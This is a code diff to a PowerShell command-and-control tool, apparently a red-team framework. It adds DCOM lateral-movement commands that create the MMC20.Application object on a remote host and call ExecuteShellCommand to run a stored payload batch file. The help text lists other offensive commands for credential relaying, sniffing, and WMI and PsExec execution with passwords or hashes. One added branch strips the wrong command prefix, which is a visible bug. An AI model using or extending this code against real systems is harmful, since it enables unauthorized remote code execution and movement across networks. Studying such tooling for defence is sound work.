@@ -524,7 +524,9 @@ $header = '
         Write-Host " Invoke-Inveigh -FileOutputDirectory C:\Temp\ -FileOutput Y -HTTP Y -Proxy Y -NBNS Y -Tool 1" -ForegroundColor Green
         Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
-        Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2" -ForegroundColor Green
+        Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2" -ForegroundColor Green        
+        write-host " Invoke-DCOMPayload -Target <ip>" -ForegroundColor Green
+        write-host " Invoke-DCOMProxyPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
         write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
@@ -1134,6 +1136,23 @@ param
                     write-host "Need to run CreateProxyPayload first"
                     $pscommand = $null
                 }
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-dcomproxypayload'))
+            {
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
+                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
+                    $target = $pscommand -replace 'invoke-dcomproxypayload -target ', ''
+                    $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $proxypayload`",`"7`")"
+                } else {
+                    write-host "Need to run CreateProxyPayload first"
+                    $pscommand = $null
+                }
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-dcompayload'))
+            {
+                   $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
+                   $target = $pscommand -replace 'invoke-dcomproxypayload -target ', ''
+                   $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $payload`",`"7`")"
             }
             if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
             {
